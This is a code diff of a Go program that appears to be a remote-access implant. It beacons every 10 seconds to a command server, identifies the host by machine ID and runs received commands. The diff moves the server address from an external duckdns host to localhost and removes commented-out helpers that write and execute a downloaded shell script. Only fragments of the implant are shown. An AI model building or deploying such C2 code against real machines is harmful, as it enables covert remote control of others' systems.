@@ -16,8 +16,6 @@ import (
 	"path"
 	"time"
 
-	// "io/ioutil"
-
 	"log"
 	"net/http"
 	"os"
@@ -26,23 +24,15 @@ import (
 	"strings"
 
 	"github.com/denisbrodbeck/machineid"
-	// "github.com/mitchellh/go-homedir"
 )
 
 // Setting the command server
 // var command_server string = "https://192.168.0.69:8081"
-var command_server string = "https://root-27.duckdns.org:8081"
-
-// var command_server string = "https://localhost:8081"
-
-// var command_server string = "http://192.168.0.29:8081"
+// var command_server string = "https://root-27.duckdns.org:8081"
+var command_server string = "https://localhost:8081"
 
 // Variables assigned later
 var NodeID string = "" // This will be a GUID at some point
-
-// var transport *http.Transport
-
-// var tlsConfig *tls.Config
 
 type CheckIn struct {
 	ID       string `json:"ID"`
@@ -97,48 +87,6 @@ func main() {
 	fmt.Println(Banner)
 
 	NodeID, _ = machineid.ID()
-	// NodeID = "test"
-
-	// Cert stuff
-
-	// AddCertToTrustStore("server.crt")
-
-	// Load the server certificate
-	// certFile := "server.crt"
-	// certBytes, err := ioutil.ReadFile(certFile)
-	// if err != nil {
-	// 	fmt.Println(err)
-	// }
-	// certPool := x509.NewCertPool()
-	// if ok := certPool.AppendCertsFromPEM(certBytes); !ok {
-	// 	// handle error
-	// 	fmt.Println("can't do something with the cert")
-	// }
-
-	// // Create the tls.Config object with the server certificate
-	// tlsConfig = &tls.Config{
-	// 	RootCAs: certPool,
-	// }
-
-	// // Create a transport that uses the client's truststore to verify the server's certificate
-	// transport = &http.Transport{
-	// 	TLSClientConfig: &tls.Config{
-	// 		RootCAs: func() *x509.CertPool {
-	// 			certPool := x509.NewCertPool()
-	// 			certFile, err := os.Open("server.crt")
-	// 			if err != nil {
-	// 				log.Fatal(err)
-	// 			}
-	// 			defer certFile.Close()
-	// 			certBytes, err := ioutil.ReadAll(certFile)
-	// 			if err != nil {
-	// 				log.Fatal(err)
-	// 			}
-	// 			certPool.AppendCertsFromPEM(certBytes)
-	// 			return certPool
-	// 		}(),
-	// 	},
-	// }
 
 	// Checks in every 10 seconds.
 	for {
@@ -609,44 +557,6 @@ func runCommand(command string) (outString string, errorMessage string) {
 	return
 
 }
-
-// // Converts an encoded script. To a script on the machine
-// func script_to_file(input string) {
-
-// 	f, err := os.Create("payloads/shell.sh")
-
-// 	if err != nil {
-// 		log.Fatal(err)
-// 	}
-
-// 	defer f.Close()
-
-// 	data := []byte(input)
-
-// 	_, err2 := f.Write(data)
-
-// 	if err2 != nil {
-// 		log.Fatal(err2)
-// 	}
-
-// 	return
-// }
-
-// // Runs a script. Currently not OS agnostic
-// func run_script(path_to_script string) (output string) {
-
-// 	output = ""
-
-// 	out, err := exec.Command("sh", path_to_script).Output()
-// 	if err != nil {
-// 		fmt.Println("Error executing script")
-// 	}
-
-// 	output = string(out)
-
-// 	return output
-
-// }
 
 // structToJSON converts a struct to a JSON string
 func structToJSON(v interface{}) (string, error) {
